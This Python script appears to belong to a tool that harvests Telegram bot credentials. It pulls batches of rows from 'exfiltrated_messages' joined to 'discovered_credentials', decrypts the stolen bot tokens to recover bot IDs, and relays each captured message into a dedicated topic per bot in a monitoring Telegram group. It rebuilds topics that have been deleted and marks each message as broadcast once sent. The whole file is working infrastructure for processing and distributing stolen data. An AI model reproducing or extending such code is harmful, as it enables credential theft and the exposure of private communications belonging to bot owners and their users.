import asyncio
import sys
import os
import time

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.core.database import db
from app.services.broadcaster_srv import broadcaster_service
from app.core.config import settings

async def run_manual_broadcast():
    print("🚀 Starting LOCAL MANUAL BROADCAST...")
    print(f"   Target Group ID: {settings.MONITOR_GROUP_ID}")
    print("-------------------------------------------------")
    
    # Import security for token decryption if needed
    from app.core.security import security

    total_sent = 0
    batch_size = 50
    
    # Local cache to avoid repeated DB/API constraints in this run
    cached_topic_ids = {}

    while True:
        # Fetch batch
        try:
            response = db.table("exfiltrated_messages")\
                .select("*, discovered_credentials!inner(meta, bot_token)")\
                .eq("is_broadcasted", False)\
                .order("telegram_msg_id", desc=False)\
                .limit(batch_size)\
                .execute()
            
            messages = response.data
        except Exception as e:
            print(f"❌ DB Error: {e}")
            break
            
        if not messages:
            print("✅ No more pending broadcasts.")
            break
            
        print(f"📦 Processing batch of {len(messages)} messages...")
        
        for msg in messages:
            try:
                cred_id = msg["credential_id"]
                cred_info = msg.get("discovered_credentials", {})
                meta = cred_info.get("meta", {}) if cred_info else {}
                
                # 1. Resolve Topic Name (Always needed for potential recreation)
                # Priority: @username / botid -> chat_name -> Cred-ID
                bot_username = meta.get("bot_username")
                bot_id = meta.get("bot_id")
                
                # If we lack bot info (Legacy data), try to fetch and extract it from token
                # Note: In this manual script we joined bot_token, so we have it!
                if not bot_id and not meta.get("bot_id"):
                     try:
                        encrypted_token = cred_info.get("bot_token")
                        if encrypted_token:
                            decrypted = security.decrypt(encrypted_token)
                            if ":" in decrypted:
                                bot_id = decrypted.split(":")[0]
                                meta["bot_id"] = bot_id # Update local meta
                                # We could update DB here to save future work
                                # db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id).execute()
                     except Exception as e:
                         pass

                if bot_username and bot_id:
                     topic_name = f"@{bot_username} / {bot_id}"
                elif bot_id:
                     topic_name = f"@unknown / {bot_id}"
                elif meta.get("chat_name"):
                     topic_name = f"{meta.get('chat_name')} (Legacy)"
                else:
                     topic_name = f"Cred-{cred_id[:8]}"

                # 2. Check Cache/DB for ID
                thread_id = cached_topic_ids.get(cred_id) or meta.get("topic_id")

                if not thread_id:
                    print(f"   🆕 Creating NEW topic: {topic_name}")
                    # Ensure Topic
                    thread_id = await broadcaster_service.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
                    
                    # Header is handled by ensure_topic now
                    
                    # Update DB
                    meta["topic_id"] = thread_id
                    db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id).execute()
                    print(f"   💾 Saved Topic ID {thread_id} for {cred_id}")
                
                # Update local cache
                cached_topic_ids[cred_id] = thread_id
                
                # 3. Send Message (with retry for deleted topics)
                try:
                    await broadcaster_service.send_message(settings.MONITOR_GROUP_ID, thread_id, msg)
                except Exception as e:
                    # Check for topic deletion/not found
                    err_str = str(e)
                    if "Topic_deleted" in err_str or "message thread not found" in err_str or "TOPIC_DELETED" in err_str:
                        print(f"    ⚠️ Topic {thread_id} deleted! Recreating '{topic_name}'...")
                        # Recreate
                        thread_id = await broadcaster_service.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
                        # Update DB
                        meta["topic_id"] = thread_id
                        db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id).execute()
                        # Update Cache so subsequent messages in this batch don't recreate again
                        cached_topic_ids[cred_id] = thread_id
                        # Retry Send
                        await broadcaster_service.send_message(settings.MONITOR_GROUP_ID, thread_id, msg)
                    else:
                        raise e
                
                # Update status
                db.table("exfiltrated_messages").update({"is_broadcasted": True}).eq("id", msg["id"]).execute()
                total_sent += 1
                
                print(f"   📤 Sent msg {msg['id']} -> Topic: {topic_name}")
                
                # Rate limit (increased to 3s to be safer)
                await asyncio.sleep(3.0) 
            except Exception as e:
                print(f"   ❌ Error sending msg {msg['id']}: {e}")
                
        # Small pause between batches
        time.sleep(1)

    print("-------------------------------------------------")
    print(f"🏁 Broadcast Complete. Total Sent: {total_sent}")

if __name__ == "__main__":
    asyncio.run(run_manual_broadcast())
